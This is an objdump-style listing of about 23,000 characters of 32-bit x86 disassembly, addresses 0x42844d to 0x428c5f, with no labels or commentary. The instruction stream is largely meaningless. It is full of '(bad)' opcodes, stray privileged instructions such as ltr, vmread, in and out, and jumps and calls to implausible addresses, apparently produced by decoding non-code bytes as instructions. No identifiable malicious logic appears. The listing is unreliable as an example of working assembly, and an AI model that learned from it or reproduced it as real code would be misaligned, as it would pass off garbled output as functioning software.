  42844d:	add    bl,bl
  42844f:	mov    WORD PTR [ebp-0x70],ax
  428453:	(bad)  
  428454:	ret    0x660d
  428457:	or     BYTE PTR [ebp-0x77],dl
  42845a:	lea    eax,[ecx+eiz*8-0x6b1276bb]
  428461:	in     al,0x89
  428463:	(bad)  
  428464:	xchg   esi,eax
  428465:	aam    0xcf
  428467:	call   0x45dafcf5
  42846c:	dec    edx
  42846d:	pop    ecx
  42846e:	mov    edx,DWORD PTR [eax]
  428470:	repnz push bp
  428473:	or     BYTE PTR [ebx+0x5510663b],0x49
  42847a:	(bad)  
  42847b:	repnz xor eax,0xa0898945
  428481:	mov    ah,0x89
  428483:	jmp    DWORD PTR [edx+0x66b0418d]
  428489:	inc    DWORD PTR [ebp+0x50]
  42848c:	add    DWORD PTR [ebp-0x5],0xffffffbe
  428490:	mov    DWORD PTR [eax],ecx
  428492:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428493:	pop    es
  428494:	inc    ecx
  428495:	(bad)  
  428496:	cbw    
  428498:	inc    ebp
  428499:	xor    ah,BYTE PTR [esi+0x3]
  42849c:	dec    ebp
  42849d:	push   eax
  42849e:	inc    bp
  4284a0:	jge    0x428425
  4284a2:	mov    esp,DWORD PTR [esi-0x18]
  4284a5:	mov    esi,DWORD PTR [edi+0x7d809cfc]
  4284ab:	add    DWORD PTR [ebx],esi
  4284ad:	add    BYTE PTR [ebx],al
  4284af:	test   DWORD PTR [ebx],esi
  4284b1:	(bad)  
  4284b2:	inc    WORD PTR [ebp+0x0]
  4284b6:	mov    eax,DWORD PTR [eax]
  4284b8:	call   0x88983bed
  4284bd:	mov    esi,eax
  4284bf:	clc    
  4284c0:	ret    
  4284c1:	rol    cl,0xa
  4284c4:	mov    DWORD PTR ds:0x7c0ec88,esi
  4284ca:	mov    edx,edi
  4284cc:	pushf  
  4284cd:	pop    es
  4284ce:	jmp    FWORD PTR [edx+0x66]
  4284d1:	add    BYTE PTR [ebp-0x990175],al
  4284d7:	inc    ebp
  4284d8:	test   DWORD PTR [ebx-0x2f000202],eax
  4284de:	push   ebp
  4284df:	mov    edi,eax
  4284e1:	mov    dh,BYTE PTR [eax+0x266ff51]
  4284e7:	push   ebp
  4284e8:	add    BYTE PTR [ebx-0x764b1777],al
  4284ee:	dec    DWORD PTR [esi+0x661851e8]
  4284f4:	add    BYTE PTR [ebp-0x7b],dl
  4284f7:	cmp    esi,0xfffffffb
  4284fa:	dec    DWORD PTR [ecx+0x51fe9285]
  428500:	jmp    DWORD PTR [esi-0x75]
  428503:	push   ebp
  428504:	hlt    
  428505:	data16 (bad) 
  428507:	dec    ebp
  428508:	ret    
  428509:	mov    ecx,DWORD PTR [ebp-0xb29b9a]
  42850f:	lea    edx,[eax-0x1]
  428512:	jne    0x4284e5
  428514:	dec    DWORD PTR [ecx-0x2f7a63f8]
  42851a:	dec    BYTE PTR [ecx+0x51559eff]
  428520:	mov    DWORD PTR [esi-0x4c],esp
  428523:	push   ebp
  428524:	jmp    DWORD PTR [esi-0x18]
  428527:	inc    ebp
  428528:	sbb    BYTE PTR [ebp-0x767ae500],cl
  42852e:	(bad)  
  42852f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428530:	inc    eax
  428532:	test   DWORD PTR [esi-0x2],esp
  428535:	inc    ebp
  428536:	dec    DWORD PTR [ebp-0x760bde75]
  42853c:	(bad)  
  42853d:	test   al,0xc3
  42853f:	mov    DWORD PTR [ebp-0x769b56],ecx
  428545:	lods   al,BYTE PTR ds:[esi]
  428546:	push   eax
  428547:	inc    ebp
  428548:	jne    0x428559
  42854a:	dec    DWORD PTR [ebp+0x8]
  42854d:	mov    eax,DWORD PTR [edi]
  42854f:	sbb    al,0x0
  428551:	(bad)  
  428552:	mov    eax,0xc14fc3
  428557:	mov    DWORD PTR [eax-0x64],edi
  42855a:	inc    bp
  42855c:	test   DWORD PTR [edi],ecx
  42855e:	dec    DWORD PTR [ebp-0x1]
  428561:	xor    eax,edi
  428563:	add    ecx,DWORD PTR [ecx-0x99bdcd]
  428569:	inc    ebp
  42856a:	xor    DWORD PTR [ebx],0x3f
  42856d:	mov    WORD PTR [ebp-0x1bc],ax
  428574:	lea    ecx,[ecx-0x767702]
  42857a:	inc    esi
  42857b:	(bad)  
  42857c:	call   FWORD PTR [ebp+ecx*4-0x3e72be01]
  428583:	pushf  
  428584:	rol    DWORD PTR [ebp-0x72019a],0xff
  42858b:	add    bh,bh
  42858d:	add    BYTE PTR [edi],cl
  42858f:	test   DWORD PTR [eax],eax
  428591:	(bad)  
  428592:	dec    WORD PTR [ebp-0xff002d]
  428599:	mov    DWORD PTR [eax+edi*4+0x0],edi
  42859d:	jmp    DWORD PTR [esi-0x73]
  4285a0:	lea    esi,[eax+0x50ffffff]
  4285a6:	fadd   QWORD PTR [ebp+0x0]
  4285a9:	xor    esp,DWORD PTR [esi+0x3]
  4285ac:	lea    edx,[eax-0x1]
  4285af:	test   edi,edi
  4285b1:	dec    DWORD PTR [ebp-0x1]
  4285b4:	mov    edi,edi
  4285b6:	dec    eax
  4285b7:	clc    
  4285b8:	call   DWORD PTR [ebp-0x73]
  4285bb:	lea    esi,[eax+0x51ffff88]
  4285c1:	lea    ecx,[ebp-0x78]
  4285c4:	test   WORD PTR [ebp-0x2],ax
  4285cb:	popf   
  4285cc:	push   eax
  4285cd:	add    BYTE PTR [ecx-0x77],dl
  4285d0:	xor    edi,DWORD PTR [eax-0x7236007d]
  4285d6:	cwde   
  4285d7:	mov    al,0x32
  4285d9:	inc    DWORD PTR [ebx]
  4285db:	push   eax
  4285dc:	push   ecx
  4285dd:	inc    ebp
  4285de:	shl    BYTE PTR [ebx],1
  4285e0:	lea    eax,[ebx]
  4285e2:	call   DWORD PTR [eax-0x1]
  4285e5:	test   DWORD PTR [ebx],esi
  4285e7:	inc    DWORD PTR [eax-0x1]
  4285ea:	(bad)  
  4285eb:	(bad)  
  4285ec:	(bad)  
  4285ed:	clc    
  4285ee:	call   DWORD PTR [ebp+0x50]
  4285f1:	jmp    0xcb876b
  4285f6:	inc    esp
  4285f7:	jnp    0x4285f8
  4285f9:	add    BYTE PTR [ecx-0x484f73],cl
  4285ff:	mov    DWORD PTR [ebx-0x7f0003c0],ecx
  428605:	mov    eax,DWORD PTR [ecx]
  428607:	data16 add BYTE PTR [ebp-0xb50077],al
  42860e:	inc    eax
  428610:	lea    esp,[esi+0x14]
  428613:	test   DWORD PTR [ecx-0xb301],ecx
  428619:	inc    edi
  42861a:	(bad)  
  42861b:	dec    si
  42861d:	test   edi,edi
  42861f:	(bad)  
  428620:	cmp    eax,0xc74f73ff
  428625:	mov    edx,DWORD PTR [edx-0x7d]
  428628:	push   DWORD PTR [ebx+0x56328939]
  42862e:	(bad)  
  42862f:	call   FWORD PTR [esi-0x47]
  428632:	inc    DWORD PTR ds:0x893c00ea
  428638:	(bad)  
  428639:	pop    eax
  42863a:	mov    ah,0xff
  42863c:	(bad)  
  42863d:	mov    ecx,0x5745
  428642:	dec    DWORD PTR [ecx-0xf7a501]
  428648:	(bad)  
  428649:	mov    ecx,0x456108
  42864e:	mov    ecx,DWORD PTR [ecx-0x3fa3e4]
  428654:	test   BYTE PTR [ebp-0x72ff23fd],cl
  42865a:	inc    BYTE PTR gs:[eax]
  42865d:	inc    DWORD PTR [ebp-0x73]
  428660:	cmp    dh,bh
  428662:	pushf  
  428663:	inc    edi
  428665:	mov    ebx,eax
  428667:	hlt    
  428668:	test   DWORD PTR [ecx-0xbab708],ecx
  42866e:	cmp    al,0xbe
  428670:	pushf  
  428671:	or     bh,al
  428673:	pop    es
  428674:	lock into 
  428676:	test   eax,eax
  428678:	clc    
  428679:	mov    ebx,0x387245
  42867e:	lahf   
  42867f:	retf   
  428680:	mov    ecx,DWORD PTR [ebx+0x40808dfc]
  428686:	add    edi,edi
  428688:	add    BYTE PTR [ecx+0x45],dl
  42868b:	ror    BYTE PTR [ebx+0x4d44fc8d],0xff
  428692:	mov    edx,DWORD PTR [ecx-0x74]
  428695:	inc    DWORD PTR [eax]
  428697:	cld    
  428698:	mov    eax,DWORD PTR [ebp-0x6f0175]
  42869e:	add    BYTE PTR [ebp-0x1b0177],al
  4286a4:	jge    0x4286eb
  4286a6:	test   DWORD PTR [ebx+0xff9875],ecx
  4286ac:	sbb    BYTE PTR [esi+0x55],ah
  4286af:	xchg   ebp,eax
  4286b0:	call   0x4281b4
  4286b5:	push   edi
  4286b6:	inc    ebp
  4286b7:	mov    dx,WORD PTR [ebp-0xfc0075]
  4286be:	cmp    al,0x85
  4286c0:	ud0    eax,DWORD PTR [ebp-0x1]
  4286c4:	test   DWORD PTR [edi+0x74],ecx
  4286c7:	dec    edi
  4286c8:	inc    DWORD PTR [ebp-0xf70004]
  4286ce:	dec    DWORD PTR [edi-0x75]
  4286d1:	dec    edi
  4286d2:	cld    
  4286d3:	test   DWORD PTR [eax+0xff01ff],eax
  4286d9:	icebp  
  4286da:	add    BYTE PTR [edi-0x3a],cl
  4286dd:	test   ebx,eax
  4286df:	inc    BYTE PTR [ebp-0x1]
  4286e2:	jne    0x4286e4
  4286e4:	mov    eax,DWORD PTR [eax]
  4286e6:	cld    
  4286e7:	xor    BYTE PTR [ecx+0x500155],cl
  4286ed:	push   ebp
  4286ee:	xor    DWORD PTR [ecx+0x45011c80],ecx
  4286f4:	add    BYTE PTR [ebp+0x35e90f50],al
  4286fa:	add    al,BYTE PTR [eax]
  4286fc:	add    BYTE PTR [ebx-0x38fe4f80],al
  428702:	add    ah,ch
  428704:	or     BYTE PTR [ebp+0x4501f845],dh
  42870a:	jmp    0xde8a07
  42870f:	(bad)  
  428710:	nop    ecx
  428713:	test   DWORD PTR [ebp+0x4502f8],eax
  428719:	cmp    cl,BYTE PTR [ebp-0x64]
  42871c:	mov    eax,edi
  42871e:	mov    ebx,DWORD PTR [eax+edx*2]
  428721:	add    eax,0x45fef885
  428726:	dec    DWORD PTR [ebx+0x339445]
  42872c:	add    ecx,DWORD PTR [ecx+0x4500f889]
  428732:	dec    DWORD PTR [ebx-0x460f0375]
  428738:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428739:	add    esi,edi
  42873b:	add    bh,bh
  42873d:	rdpmc  
  42873f:	add    BYTE PTR [ebx],0x1
  428742:	mov    DWORD PTR [eax],eax
  428744:	add    al,0x45
  428746:	dec    DWORD PTR [ecx-0x360b3373]
  42874c:	dec    DWORD PTR [esi]
  42874e:	push   eax
  42874f:	jne    0x428796
  428751:	mov    esi,DWORD PTR [ebx]
  428753:	cld    
  428754:	add    ebp,ebx
  428756:	push   eax
  428757:	inc    DWORD PTR [ebp-0x75]
  42875a:	add    eax,0x800e4
  42875f:	add    BYTE PTR [ebx-0x7f7403bf],cl
  428765:	mov    DWORD PTR [ecx],eax
  428767:	sbb    al,0x0
  428769:	leave  
  42876a:	test   DWORD PTR [edi-0x2],eax
  42876d:	jne    0x42876e
  42876f:	call   0xff437274
  428774:	xor    BYTE PTR [ebp+0x4d],al
  428777:	mov    edi,edi
  428779:	enter  0x8,0x4d
  42877d:	mov    ecx,DWORD PTR [ebx-0x7fc74cd]
  428783:	mov    eax,DWORD PTR [eax]
  428785:	cld    
  428786:	add    DWORD PTR [ecx],ebx
  428788:	inc    ebp
  428789:	dec    ebp
  42878a:	mov    DWORD PTR [ebx+0x1ccc8b],ecx
  428790:	inc    eax
  428791:	dec    DWORD PTR [ecx-0x270375]
  428797:	add    BYTE PTR [ebx-0x39d72701],cl
  42879d:	xchg   ecx,eax
  42879e:	ret    
  42879f:	add    BYTE PTR [ebp-0x830075],al
  4287a5:	add    BYTE PTR [ebp-0x75],al
  4287a8:	mov    DWORD PTR [ebp+0x8ff0404],ecx
  4287ae:	lea    edi,[edi-0xc]
  4287b1:	add    bh,bh
  4287b3:	mov    edx,DWORD PTR [eax-0x7b]
  4287b6:	inc    ebp
  4287b7:	rdpmc  
  4287b9:	jne    0x4287be
  4287bb:	add    BYTE PTR [eax-0x75],dl
  4287be:	inc    ebp
  4287bf:	clc    
  4287c0:	add    eax,0x400009
  4287c5:	mov    DWORD PTR [ebx-0x7f000304],ecx
  4287cb:	mov    eax,DWORD PTR [ecx]
  4287cd:	in     al,dx
  4287ce:	add    dh,al
  4287d0:	test   ebx,eax
  4287d2:	inc    BYTE PTR [ebp-0xff0001]
  4287d8:	add    BYTE PTR [ebp-0x43],al
  4287db:	cmp    esi,0xfffffff8
  4287de:	(bad)  
  4287df:	push   DWORD PTR [eax]
  4287e1:	add    BYTE PTR [ebp-0x3a],dl
  4287e4:	test   ebx,eax
  4287e6:	je     0x42876d
  4287e8:	mov    edi,edi
  4287ea:	sbb    al,0xff
  4287ec:	test   DWORD PTR gs:[eax],eax
  4287ef:	(bad)  
  4287f0:	js     0x4287f1
  4287f2:	add    BYTE PTR [ebx-0x39b20bdd],cl
  4287f8:	sub    eax,ebx
  4287fa:	mov    ecx,DWORD PTR [ebx-0x55130377]
  428800:	add    eax,DWORD PTR [eax]
  428802:	dec    ebp
  428803:	push   eax
  428804:	mov    al,BYTE PTR [ebp+0x1]
  428807:	mov    eax,DWORD PTR [ebp-0x68]
  42880a:	mov    eax,DWORD PTR [eax]
  42880c:	sbb    bh,al
  42880e:	or     ah,dh
  428810:	dec    ebp
  428811:	inc    DWORD PTR [eax+0x4]
  428814:	push   ecx
  428815:	add    BYTE PTR [edx-0x1],dh
  428818:	mov    ecx,DWORD PTR [ecx+0x55cfe83c]
  42881e:	or     DWORD PTR [ebx-0x7ff3400],0x8b5545d7
  428828:	add    ecx,DWORD PTR [ecx-0x1be77477]
  42882e:	push   ecx
  42882f:	cmp    BYTE PTR [ebx],al
  428831:	inc    ebp
  428832:	mov    DWORD PTR [ebx-0x7aaaafe4],ecx
  428838:	(bad)  
  428839:	(bad)  
  42883a:	in     al,0xff
  42883c:	add    BYTE PTR [ebp+0x0],al
  42883f:	xor    eax,DWORD PTR [eax-0x7c76fffd]
  428845:	add    al,bh
  428847:	(bad)  
  428848:	jmp    0x8d85:0x74b0558d
  42884f:	dec    DWORD PTR [eax]
  428851:	call   DWORD PTR [ebp-0x7b]
  428854:	mov    edi,esi
  428856:	lock call DWORD PTR [ebp-0x75]
  42885a:	mov    esi,esp
  42885c:	mov    ah,0xc6
  42885e:	mov    bh,0xc3
  428860:	mov    DWORD PTR [ebx-0x110003c4],ecx
  428866:	add    DWORD PTR [eax],0x450050ff
  42886c:	mov    DWORD PTR [ebx+0x9598cc],ecx
  428872:	inc    edi
  428874:	push   esp
  428876:	jmp    0xcd00:0x680481ff
  42887d:	mov    DWORD PTR [ebx],esi
  42887f:	clc    
  428880:	cmp    edi,0xff9cff3b
  428886:	jne    0x428890
  428888:	mov    eax,eax
  42888a:	add    esi,DWORD PTR [eax]
  42888c:	int3   
  42888d:	inc    ebp
  42888e:	cmp    al,0x83
  428890:	add    BYTE PTR [eax],bl
  428892:	adc    DWORD PTR [ebx+0x768b5055],eax
  428898:	add    ecx,DWORD PTR [ebx-0x30ba17c7]
  42889e:	mov    edi,eax
  4288a0:	cmp    BYTE PTR [ebp+0x45],cl
  4288a3:	jmp    0x428830
  4288a5:	mov    ebx,DWORD PTR [esp+ebp*8]
  4288a8:	inc    ebp
  4288a9:	or     al,0x2
  4288ab:	dec    DWORD PTR [ebp+0x18]
  4288ae:	jne    0x428905
  4288b0:	mov    ecx,DWORD PTR [eax+0x1c558bf8]
  4288b6:	mov    edi,DWORD PTR [ebx]
  4288b8:	in     al,0x50
  4288ba:	xchg   ecx,eax
  4288bb:	jmp    0x342d7c0
  4288c0:	adc    al,0x8b
  4288c2:	inc    ebp
  4288c3:	mov    al,ds:0x8b04008b
  4288c8:	push   ebp
  4288c9:	sub    ecx,DWORD PTR [ecx-0x2d381318]
  4288cf:	push   ebp
  4288d0:	test   DWORD PTR [ebx-0x2800d701],ecx
  4288d6:	inc    ebp
  4288d7:	dec    ebp
  4288d8:	mov    DWORD PTR [ecx+0x45ffb8f8],ecx
  4288de:	mov    DWORD PTR [eax],0xe9ff00f4
  4288e4:	add    al,0x0
  4288e6:	add    BYTE PTR [eax],al
  4288e8:	mov    eax,edx
  4288ea:	push   eax
  4288eb:	rol    DWORD PTR [ebp-0xf0177],1
  4288f1:	bound  eax,QWORD PTR [ebp+0x50]
  4288f4:	xor    ecx,DWORD PTR [ecx+0x5589b403]
  4288fa:	add    BYTE PTR [ecx+0x558df0ff],cl
  428900:	mov    al,0xf
  428902:	test   DWORD PTR [edx],edx
  428904:	call   DWORD PTR [ebp-0x7a0001]
  42890a:	(bad)  
  42890b:	loop   0x42890c
  42890d:	jnp    0xc6987d13
  428913:	mov    eax,ebx
  428915:	cmp    al,0x8b
  428917:	(bad)  
  428918:	cld    
  428919:	shr    esi,0xc
  42891c:	add    dl,al
  42891e:	push   eax
  42891f:	lea    eax,[ebp-0x1]
  428922:	mov    edx,esi
  428924:	cwde   
  428925:	cli    
  428926:	add    BYTE PTR [ebp+0x1ffff8ff],al
  42892c:	or     BYTE PTR [eax],cl
  42892e:	inc    ebp
  42892f:	dec    ebp
  428930:	inc    DWORD PTR [ebx+0x74803914]
  428936:	add    DWORD PTR [ebx+0x451800],ecx
  42893c:	call   DWORD PTR [eax+edx*1]
  42893f:	add    ecx,DWORD PTR [ebp-0x34]
  428942:	push   edi
  428943:	adc    al,0x8
  428945:	mov    edx,DWORD PTR [ebp-0x14]
  428948:	mov    ecx,DWORD PTR [ebp+0x18]
  42894b:	add    DWORD PTR [ebp-0x4c],0xffffff8d
  42894f:	inc    DWORD PTR [eax+esi*8]
  428952:	inc    ebp
  428953:	stos   BYTE PTR es:[edi],al
  428954:	mov    edx,DWORD PTR [ebp-0x4]
  428957:	add    DWORD PTR [ebp-0x1c],eax
  42895a:	mov    edx,DWORD PTR [ebp-0x70]
  42895d:	cmp    eax,DWORD PTR [eax]
  42895f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428960:	mov    eax,DWORD PTR [eax]
  428962:	cld    
  428963:	jae    0x4288e5
  428965:	add    eax,DWORD PTR [ecx]
  428967:	clc    
  428968:	add    BYTE PTR [eax+0x30],dl
  42896b:	mov    DWORD PTR [ecx],esi
  42896d:	clc    
  42896e:	pop    ds
  42896f:	inc    ebp
  428970:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  428976:	(bad)  
  428977:	push   DWORD PTR [edi]
  428979:	mov    ecx,DWORD PTR [ebx+0x398503e8]
  42897f:	(bad)  
  428980:	jae    0x428981
  428982:	mov    eax,DWORD PTR [ebp-0x740175]
  428988:	sub    eax,DWORD PTR [eax]
  42898a:	add    eax,DWORD PTR [eax]
  42898c:	mov    DWORD PTR [ecx+0x5f],eax
  42898f:	mov    DWORD PTR [ebx-0x4],ebx
  428992:	ret    0xff
  428995:	mov    ecx,DWORD PTR [ebx+0x1cc683d8]
  42899b:	ret    
  42899c:	mov    eax,DWORD PTR [ebp-0x6f0075]
  4289a2:	add    BYTE PTR [ebp-0x7d],al
  4289a5:	mov    DWORD PTR [eax],eax
  4289a7:	add    al,0x84
  4289a9:	inc    DWORD PTR [ecx]
  4289ab:	lea    eax,[eax]
  4289ad:	hlt    
  4289ae:	sar    bh,cl
  4289b0:	test   BYTE PTR [eax+0x1],dl
  4289b3:	inc    ebp
  4289b4:	add    BYTE PTR [ebx],dh
  4289b6:	test   BYTE PTR [ebx],0x84
  4289b9:	push   eax
  4289ba:	add    BYTE PTR [ebp+0x0],al
  4289bd:	add    eax,0x86
  4289c2:	add    BYTE PTR [ebx-0x7f7b0340],cl
  4289c8:	add    BYTE PTR [ecx],al
  4289ca:	add    BYTE PTR [eax],al
  4289cc:	mov    esi,0x550030
  4289d1:	mov    ecx,DWORD PTR [edi]
  4289d3:	cld    
  4289d4:	fidiv  DWORD PTR [ebp+0x0]
  4289d7:	mov    edi,DWORD PTR [ecx]
  4289d9:	xor    BYTE PTR [eax+eax*1],0x84
  4289dd:	add    eax,DWORD PTR [eax]
  4289df:	sbb    BYTE PTR [eax],al
  4289e1:	jne    0x428994
  4289e3:	mov    eax,DWORD PTR [ecx]
  4289e5:	sbb    BYTE PTR [eax],al
  4289e7:	mov    DWORD PTR [ebp-0x1],esp
  4289ea:	add    BYTE PTR [eax+0x30e45ca],bh
  4289f0:	ret    0xb7fc
  4289f3:	dec    ebp
  4289f4:	or     al,0x89
  4289f6:	dec    ebp
  4289f7:	cld    
  4289f8:	cmovne ecx,DWORD PTR [eax-0x75]
  4289fc:	add    edi,esp
  4289fe:	seto   BYTE PTR [esi-0x72ffffff]
  428a05:	inc    ebp
  428a06:	adc    al,0x8b
  428a08:	mov    DWORD PTR [eax+ebp*8-0x740100],ecx
  428a0f:	cmp    DWORD PTR [edi+0x72],edx
  428a12:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  428a18:	gs cmp al,0x0
  428a1b:	je     0x4289f3
  428a1d:	push   eax
  428a1e:	sar    BYTE PTR [eax],1
  428a20:	mov    bh,0x3e
  428a22:	push   cs
  428a23:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  428a29:	add    DWORD PTR [ecx+0x12],ebp
  428a2c:	dec    edx
  428a2d:	(bad)  
  428a2e:	mov    eax,edx
  428a30:	in     al,dx
  428a31:	adc    DWORD PTR [ecx],esi
  428a33:	pop    esi
  428a34:	inc    ecx
  428a35:	leave  
  428a36:	or     DWORD PTR [eax],ebx
  428a38:	gs push ebp
  428a3a:	add    ah,ch
  428a3c:	into   
  428a3d:	in     al,dx
  428a3e:	enter  0xb756,0xf0
  428a42:	push   cs
  428a43:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  428a4d:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  428a53:	jnp    0x74430f5b
  428a59:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  428a5f:	add    BYTE PTR [edi],cl
  428a61:	mov    edi,DWORD PTR [ecx-0x78]
  428a64:	ltr    WORD PTR [ecx-0x7b]
  428a68:	dec    DWORD PTR [edi]
  428a6a:	clc    
  428a6b:	out    0x45,eax
  428a6d:	add    BYTE PTR [eax],cl
  428a6f:	cmp    ebx,0xffffff8c
  428a72:	jge    0x428a74
  428a74:	jb     0x428a86
  428a76:	je     0x518af6
  428a7c:	pop    edx
  428a7d:	push   esi
  428a7e:	mov    ecx,DWORD PTR [edi]
  428a80:	in     al,dx
  428a81:	rol    DWORD PTR [ebp+0x0],1
  428a84:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  428a8b:	cmp    DWORD PTR [ecx],0xfffffff0
  428a8e:	hlt    
  428a8f:	mov    esp,DWORD PTR [eax+0xf034d2b]
  428a95:	(bad)  
  428a97:	push   eax
  428a98:	jns    0xb8426f16
  428a9e:	lock push cs
  428aa0:	ror    edx,0x3
  428aa3:	test   BYTE PTR [ecx+0x5500e800],cl
  428aa9:	dec    eax
  428aaa:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  428aae:	(bad)  
  428aaf:	mov    esi,0x7f33ff5f
  428ab4:	inc    eax
  428ab5:	test   DWORD PTR [edx],eax
  428ab7:	je     0x428a79
  428ab9:	mov    ecx,ecx
  428abb:	adc    DWORD PTR [ebp-0xc],0xffffffec
  428abf:	and    eax,DWORD PTR [eax+0xf0103]
  428ac5:	jp     0x428ab3
  428ac7:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  428acb:	add    edx,DWORD PTR [edi+0x74]
  428ace:	sbb    BYTE PTR [ebp+0x4d001484],cl
  428ad4:	add    BYTE PTR [ebp-0x74c48bbb],al
  428ada:	je     0x428a5f
  428adc:	cmp    eax,edi
  428ade:	js     0x428b03
  428ae0:	add    eax,0xeb0fc003
  428ae5:	jns    0x428a72
  428ae7:	vmread DWORD PTR [ecx+0x45],ebx
  428aeb:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  428af1:	adc    al,0x8b
  428af3:	jge    0x428b09
  428af5:	mov    edi,DWORD PTR [eax-0x4]
  428af8:	add    edi,DWORD PTR [edi]
  428afa:	or     bh,bh
  428afc:	push   ebp
  428afd:	push   es
  428afe:	mov    DWORD PTR [ebp-0x4],ebx
  428b01:	add    edi,esi
  428b03:	pop    es
  428b04:	add    esi,DWORD PTR [edi-0x48ccf183]
  428b0a:	mov    DWORD PTR [esp+esi*8],ecx
  428b0d:	inc    ebp
  428b0e:	pop    ebp
  428b0f:	xor    DWORD PTR [esi-0x4],0x3b
  428b13:	add    edx,DWORD PTR [ecx+edi*1]
  428b16:	push   es
  428b17:	clc    
  428b18:	mov    bh,0xdb
  428b1a:	jp     0x428ad3
  428b1c:	add    cl,BYTE PTR [esi]
  428b1e:	div    DWORD PTR [edi+0x4d8b0c1c]
  428b24:	test   edi,edi
  428b26:	je     0x428b1c
  428b28:	mov    eax,ecx
  428b2a:	or     BYTE PTR [ebx],al
  428b2c:	dec    BYTE PTR [ecx+0x7d3bec7d]
  428b32:	jbe    0x428ba6
  428b34:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  428b3a:	add    ecx,DWORD PTR [esi]
  428b3c:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  428b42:	add    eax,DWORD PTR [ebx-0x287af783]
  428b48:	je     0x428b97
  428b4a:	mov    DWORD PTR [ecx],edi
  428b4c:	mov    esi,eax
  428b4e:	hlt    
  428b4f:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  428b56:	jb     0x428b18
  428b58:	jmp    0x428b45
  428b5a:	xor    esi,DWORD PTR [ebx]
  428b5c:	pop    edi
  428b5d:	pop    esi
  428b5e:	pop    ebx
  428b5f:	ret    
  428b60:	ret    0x8b
  428b63:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  428b69:	cmp    DWORD PTR [eax],0xc
  428b6c:	pushf  
  428b6d:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  428b73:	(bad)  
  428b75:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  428b7c:	dec    ebp
  428b7d:	ret    
  428b7e:	mov    edi,DWORD PTR [esi-0x4]
  428b81:	pop    eax
  428b82:	dec    ebp
  428b83:	jne    0x428b10
  428b85:	xor    edi,esp
  428b87:	inc    eax
  428b88:	dec    ebp
  428b89:	jbe    0x428bde
  428b8b:	inc    eax
  428b8c:	pop    ebp
  428b8d:	add    edx,DWORD PTR [esi+0x8]
  428b90:	push   eax
  428b91:	dec    eax
  428b92:	push   ecx
  428b93:	mov    eax,edi
  428b95:	and    al,0xf0
  428b97:	jo     0x428b84
  428b99:	mov    eax,DWORD PTR [ebx]
  428b9b:	sbb    BYTE PTR [ebp+0x4d],cl
  428b9e:	mov    eax,DWORD PTR [ebx]
  428ba0:	nop
  428ba1:	or     BYTE PTR [eax],al
  428ba3:	jne    0x428bfc
  428ba5:	cmp    ebx,DWORD PTR [eax+0x33893277]
  428bab:	cld    
  428bac:	xor    edi,edi
  428bae:	add    edi,DWORD PTR [ebp+0x3]
  428bb1:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  428bb7:	js     0x428b3d
  428bb9:	jae    0x428bbd
  428bbb:	(bad)  
  428bbd:	xor    al,0x5d
  428bbf:	jmp    0x428b4c
  428bc1:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  428bc8:	fdecstp 
  428bca:	test   BYTE PTR [edi],ah
  428bcc:	add    bh,BYTE PTR [ebp+0x0]
  428bcf:	add    ebx,DWORD PTR [ebp-0x77]
  428bd2:	mov    edi,eax
  428bd4:	cmp    al,0x0
  428bd7:	adc    dh,BYTE PTR [ebx]
  428bd9:	jge    0x428bde
  428bdb:	mov    edi,DWORD PTR [ebx]
  428bdd:	jl     0x428bee
  428bdf:	clc    
  428be0:	dec    edi
  428be1:	jge    0x428be3
  428be3:	mov    eax,DWORD PTR [ebx]
  428be5:	jb     0x428bef
  428be7:	mov    ecx,DWORD PTR [ebp-0x8]
  428bea:	mov    edi,edi
  428bec:	xor    edx,DWORD PTR [eax]
  428bee:	add    edi,DWORD PTR [ebx]
  428bf0:	mov    DWORD PTR [ebp-0x10],edi
  428bf3:	inc    edi
  428bf4:	pop    ebp
  428bf5:	jge    0x428c32
  428bf7:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  428bfb:	mov    edx,0xc05d87f0
  428c00:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  428c04:	fimul  WORD PTR [eax]
  428c06:	fist   WORD PTR [ebp+0x1c]
  428c09:	in     al,dx
  428c0a:	jne    0x428bf8
  428c0c:	mov    edi,DWORD PTR [edx-0x7a27a10]
  428c12:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  428c16:	fdivp  st(0),st
  428c18:	fild   WORD PTR [ebp+0x4510f85c]
  428c1e:	test   BYTE PTR [ebx+0x4d00fc02],cl
  428c24:	inc    ebp
  428c25:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  428c2b:	mov    ebp,DWORD PTR [ebx-0x4]
  428c2e:	adc    al,0x8b
  428c30:	rcl    DWORD PTR [eax],0x48
  428c33:	mov    esi,0x7080803
  428c38:	fiadd  WORD PTR [ebp+0x4d]
  428c3b:	mov    cs,WORD PTR [ebx+0x558bfc52]
  428c41:	cld    
  428c42:	xor    ebx,DWORD PTR [ebx+0x330103]
  428c48:	mov    DWORD PTR [edi+0x872dc],edi
  428c4e:	xlat   BYTE PTR ds:[ebx]
  428c4f:	into   
  428c50:	ffreep st(6)
  428c52:	retf   0x6c7
  428c55:	iret   
  428c56:	dec    ebp
  428c57:	inc    ebp
  428c58:	mov    DWORD PTR [ebx],edi
  428c5a:	fmul   QWORD PTR [edi]
  428c5c:	dec    ebp
  428c5d:	jnp    0x428c92
  428c5f:	add    BYTE PTR [ebx],al
